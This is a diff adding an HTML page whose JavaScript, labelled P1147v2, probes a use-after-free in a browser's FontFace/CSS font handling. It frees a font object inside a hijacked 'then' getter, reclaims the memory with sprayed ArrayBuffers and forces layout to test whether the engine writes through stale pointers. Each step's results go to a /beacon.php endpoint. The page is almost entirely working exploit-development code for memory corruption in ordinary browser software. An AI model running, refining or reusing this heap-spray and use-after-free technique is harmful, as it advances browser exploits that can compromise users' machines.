@@ -1,0 +1,272 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1147v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1147v2: C++ ACCESS AFTER UAF RECLAIM (FIXED) ===');
+log('info','v1 bug: delete ran before microtask. Fixed: setTimeout cleanup');
+log('info','Test A: zero reclaim + check modifications');
+log('info','Test B: keep stylesheet + force CSS layout with freed font');
+B('P1147V2-START','t='+Date.now());
+
+// ===== TEST A: UAF + zero reclaim + check if engine modifies our buffer =====
+var r=Date.now()%100000;
+var sprayA=[];
+var uafA=false;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafA)return undefined;uafA=true;
+  log('ok','A: then getter fired!');
+  B('P1147V2-A-THEN','fired');
+
+  // Free CSSFontFace
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // Reclaim with ZERO-filled 192B ArrayBuffers
+  for(var k=0;k<50;k++) sprayA.push(new ArrayBuffer(192));
+  log('ok','A: freed + sprayed '+sprayA.length+' zero bufs');
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(!uafA){
+    log('fail','A: then getter never fired');
+    B('P1147V2-A-RESULT','then=false');
+    doTestB();
+    return;
+  }
+
+  // Check if engine MODIFIED any of our zero-filled spray buffers
+  var modified=0;
+  var modBufs=[];
+  for(var k=0;k<sprayA.length;k++){
+    var v=new BigUint64Array(sprayA[k]);
+    for(var q=0;q<v.length;q++){
+      if(v[q]!==0n){
+        modified++;
+        if(modBufs.length<5){
+          var d=[];
+          for(var dd=0;dd<Math.min(v.length,8);dd++) d.push(hex64(v[dd]));
+          modBufs.push({idx:k,q:q,val:hex64(v[q]),d:d});
+        }
+        break;
+      }
+    }
+  }
+
+  log('ok','A: modified buffers: '+modified+'/'+sprayA.length);
+  B('P1147V2-A-RESULT','then=true|modified='+modified);
+
+  if(modified>0){
+    log('win','!!! ENGINE WROTE TO RECLAIMED CELLS !!!');
+    for(var i=0;i<modBufs.length;i++){
+      var mb=modBufs[i];
+      log('ptr','  buf['+mb.idx+'] q'+mb.q+'='+mb.val);
+      log('ptr','  '+mb.d.join(' '));
+      if(i<3) B('P1147V2-A-MOD-'+i,'idx='+mb.idx+'|q='+mb.q+'|val='+mb.val);
+    }
+  }else{
+    log('info','A: zero writes to reclaimed cells (engine did not touch freed memory)');
+  }
+
+  doTestB();
+},60);
+
+function doTestB(){
+  // ===== TEST B: Keep stylesheet, force CSS layout with freed font =====
+  log('phase','--- B: UAF + KEEP style + force CSS layout ---');
+  log('info','Hypothesis: CSS font matcher chases stylesheet->CSSFontFace pointer');
+
+  var r2=Date.now()%100000+1;
+  var sprayB=[];
+  var uafB=false;
+
+  // Create style WITH a class that uses the font + the @font-face
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:ww"+r2+";src:local(Arial);unicode-range:U+0045}" +
+    " .usefont"+r2+"{font-family:ww"+r2+",serif;font-size:48px;}";
+  document.head.appendChild(st2);
+  var ff2=new FontFace('xx"+r2+"','local(Helvetica)',{unicodeRange:'U+0046'});
+  document.fonts.add(ff2);void ff2.loaded;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(uafB)return undefined;uafB=true;
+    log('ok','B: then getter fired!');
+    B('P1147V2-B-THEN','fired');
+
+    // ONLY delete from document.fonts, keep the stylesheet!
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    // Reclaim with MARKER pattern
+    for(var k=0;k<50;k++){
+      var ab=new ArrayBuffer(192);
+      var v=new BigUint64Array(ab);
+      v[0]=0xDEADBEEFn;
+      v[1]=0xCAFEBABEn;
+      v[2]=0x41414141n;
+      sprayB.push(ab);
+    }
+    log('ok','B: freed (style kept) + sprayed marker bufs');
+
+    // NOW force layout with elements using the font family!
+    // The CSS engine should try to match .usefont -> @font-face -> CSSFontFace (FREED!)
+    for(var i=0;i<10;i++){
+      var el=document.createElement('div');
+      el.className='usefont'+r2;
+      el.textContent='EEEEE TEST '+i;
+      document.body.appendChild(el);
+    }
+    document.body.offsetHeight; // force layout!
+    log('ok','B: forced layout with freed font');
+
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em xx'+r2+', ww'+r2,'EF').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    if(!uafB){
+      log('fail','B: then getter never fired');
+      B('P1147V2-B-RESULT','then=false');
+      doTestC();
+      return;
+    }
+
+    // Check if our MARKER buffers were modified
+    var changed=0;
+    var details=[];
+    for(var k=0;k<sprayB.length;k++){
+      var v=new BigUint64Array(sprayB[k]);
+      if(v[0]!==0xDEADBEEFn || v[1]!==0xCAFEBABEn || v[2]!==0x41414141n){
+        changed++;
+        if(details.length<5){
+          var d=[];
+          for(var dd=0;dd<8;dd++) d.push(hex64(v[dd]));
+          details.push({idx:k,d:d});
+        }
+      }
+    }
+
+    log('ok','B: changed marker bufs: '+changed+'/'+sprayB.length);
+    B('P1147V2-B-RESULT','then=true|changed='+changed);
+
+    if(changed>0){
+      log('win','!!! CSS ENGINE MODIFIED RECLAIMED CELLS !!!');
+      log('win','The stylesheet->CSSFontFace pointer is STALE and the engine USED IT!');
+      for(var i=0;i<details.length;i++){
+        log('ptr','  buf['+details[i].idx+']: '+details[i].d.slice(0,4).join(' '));
+        if(i<3) B('P1147V2-B-MOD-'+i,details[i].d.slice(0,4).join(','));
+      }
+    }else{
+      log('info','B: markers intact. CSS engine did not chase the stale pointer.');
+    }
+
+    // Clean up style
+    if(st2.parentNode) st2.remove();
+    doTestC();
+  },60);
+}
+
+function doTestC(){
+  // ===== TEST C: Read FontFace properties AFTER UAF =====
+  log('phase','--- C: FontFace JS property access after UAF ---');
+  log('info','Do .status/.family/.unicodeRange read from reclaimed buffer?');
+
+  var r3=Date.now()%100000+2;
+  var sprayC=[];
+  var uafC=false;
+
+  var st3=document.createElement('style');
+  st3.textContent="@font-face{font-family:zzz"+r3+";src:local(Arial);unicode-range:U+0047}";
+  document.head.appendChild(st3);
+  var ff3=new FontFace('xxx'+r3,'local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(ff3);void ff3.loaded;
+
+  // Save pre-UAF properties
+  var preFam='?',preStat='?',preUR='?';
+  try{preFam=ff3.family;}catch(e){}
+  try{preStat=ff3.status;}catch(e){}
+  try{preUR=ff3.unicodeRange;}catch(e){}
+  log('info','Pre-UAF: family='+preFam+' status='+preStat+' range='+preUR);
+  B('P1147V2-C-PRE','fam='+preFam+'|stat='+preStat+'|ur='+preUR);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(uafC)return undefined;uafC=true;
+    log('ok','C: then getter fired!');
+    if(st3.parentNode)st3.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // Reclaim with distinctive pattern
+    for(var k=0;k<50;k++){
+      var ab=new ArrayBuffer(192);
+      var v=new BigUint64Array(ab);
+      for(var q=0;q<24;q++) v[q]=BigInt(0x42420000+q);
+      sprayC.push(ab);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em xxx'+r3+', zzz'+r3,'GH').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    if(!uafC){
+      log('fail','C: then getter never fired');
+      B('P1147V2-C-RESULT','then=false');
+      doFinal();
+      return;
+    }
+
+    // Read FontFace properties AFTER UAF + reclaim
+    var postFam='?',postStat='?',postUR='?',postLoaded='?';
+    try{postFam=ff3.family;}catch(e){postFam='ERR:'+e.message.substring(0,30);}
+    try{postStat=ff3.status;}catch(e){postStat='ERR:'+e.message.substring(0,30);}
+    try{postUR=ff3.unicodeRange;}catch(e){postUR='ERR:'+e.message.substring(0,30);}
+
+    var famChanged=(postFam!==preFam);
+    var statChanged=(postStat!==preStat);
+
+    log('ok','Post-UAF: family='+postFam+' status='+postStat+' range='+postUR);
+    log(famChanged?'win':'info','Family changed: '+famChanged+' ('+preFam+' -> '+postFam+')');
+    log(statChanged?'win':'info','Status changed: '+statChanged+' ('+preStat+' -> '+postStat+')');
+    B('P1147V2-C-RESULT','then=true|fam='+postFam+'|stat='+postStat+'|ur='+postUR);
+    B('P1147V2-C-CHANGED','fam='+famChanged+'|stat='+statChanged);
+
+    // Check if spray was modified
+    var cMod=0;
+    for(var k=0;k<sprayC.length;k++){
+      var v=new BigUint64Array(sprayC[k]);
+      if(v[0]!==BigInt(0x42420000)){cMod++;break;}
+    }
+    log('info','C: spray modified: '+cMod);
+    B('P1147V2-C-SPRAY','modified='+cMod);
+
+    doFinal();
+  },60);
+}
+
+function doFinal(){
+  B('P1147V2-DONE','complete');
+  log('phase','=== P1147v2 COMPLETE ===');
+}
+</script></body></html>
